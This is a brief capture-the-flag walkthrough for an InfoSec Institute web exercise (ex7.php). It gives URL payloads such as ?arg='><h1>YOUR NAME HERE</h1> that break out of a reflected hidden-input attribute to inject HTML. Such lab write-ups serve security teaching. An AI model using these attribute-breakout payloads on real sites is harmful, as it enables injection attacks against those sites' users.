Add in url parameter action(see html-code) with any tag

`http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?action="><h1>`

get url with error

`http://ctf.infosecinstitute.com/ctf2/e?arg=xercises/ex7.php?action="><h1>`

go back and break this 

`<input name="action" type="hidden" value="/ctf2/exercises/ex7.php               ">`

in url write

`http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg='><h1>YOUR NAME HERE</h1>`

done.